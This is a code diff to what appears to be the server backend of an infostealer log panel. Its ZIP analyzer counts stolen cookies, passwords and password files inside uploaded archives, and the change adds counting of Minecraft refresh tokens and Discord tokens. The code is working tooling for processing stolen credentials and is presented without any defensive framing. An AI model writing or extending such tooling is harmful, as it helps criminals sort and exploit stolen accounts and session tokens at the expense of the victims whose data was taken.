@@ -58,7 +58,7 @@ const tlsOpts = {
   key:  fs.readFileSync(CFG.tlsKey),
 };
 
-// ─── ZIP ANALYZER ───────────────────────────────────────────────────────────
+// ─── ZIP ANALYZER (WITH DISCORD TOKENS) ──────────────────────────────────────
 function analyzeZip(filePath) {
     try {
         const zip = new AdmZip(filePath);
@@ -67,6 +67,8 @@ function analyzeZip(filePath) {
         let netscapeCookies = 0;
         let jsonCookies = 0;
         let passwords = 0;
+        let mcTokens = 0;
+        let discordTokens = 0;
         let passwordFiles = [];
         let cookieFiles = [];
         
@@ -102,11 +104,19 @@ function analyzeZip(filePath) {
                         passwordFiles.push({ name, count: parsed.length });
                     }
                 } catch {}
+            } else if (lower.endsWith('refreshtokens.txt') || lower.includes('minecraft_auth')) {
+                const content = entry.getData().toString('utf8');
+                const lines = content.split('\n').filter(l => l.trim() && !l.startsWith('#') && l.trim() !== '0 tokens');
+                mcTokens += lines.length;
+            } else if (lower.includes('discord') && lower.endsWith('.txt')) {
+                const content = entry.getData().toString('utf8');
+                const lines = content.split('\n').filter(l => l.trim() && !l.startsWith('#') && l.trim() !== '0 tokens');
+                discordTokens += lines.length;
             }
         }
-        return { netscapeCookies, jsonCookies, passwords, passwordFiles, cookieFiles };
+        return { netscapeCookies, jsonCookies, passwords, mcTokens, discordTokens, passwordFiles, cookieFiles };
     } catch (e) {
-        return { netscapeCookies: 0, jsonCookies: 0, passwords: 0, passwordFiles: [], cookieFiles: [] };
+        return { netscapeCookies: 0, jsonCookies: 0, passwords: 0, mcTokens: 0, discordTokens: 0, passwordFiles: [], cookieFiles: [] };
     }
 }
 
